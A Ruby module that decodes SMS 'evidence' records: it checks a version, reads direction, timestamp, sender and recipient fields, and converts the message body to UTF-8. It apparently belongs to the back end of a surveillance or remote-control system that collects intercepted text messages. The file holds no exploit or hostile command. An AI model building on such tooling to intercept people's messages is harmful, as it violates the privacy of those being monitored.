require_relative 'common'
require_relative '../serializer'

module RCS
module SmsnewEvidence

  SMS_VERSION = 2010050501

  def content
    raise "Not implemented!"
  end

  def generate_content
    raise "Not implemented!"
  end

  def decode_additional_header(data)
    binary = StringIO.new data

    version = binary.read(4).unpack('l').first
    puts version
    raise EvidenceDeserializeError.new("invalid log version for SMS") unless version == SMS_VERSION

    ret = Hash.new
    ret[:data] = Hash.new

    ret[:data][:incoming] = binary.read(4).unpack('l').first
    low, high = binary.read(8).unpack 'V2'
    ret[:data][:time] = Time.from_filetime high, low
    ret[:data][:from] = binary.read(16)
    ret[:data][:rcpt] = binary.read(16)

    return ret
  end

  def decode_content(common_info, chunks)
    info = Hash[common_info]
    info[:data] ||= Hash.new
    info[:data][:type] = :sms

    stream = StringIO.new chunks.join

    info[:data][:content] = stream.read.utf16le_to_utf8

    yield info if block_given?
    :delete_raw
  end
end # ::MessageEvidence
end # ::RCS
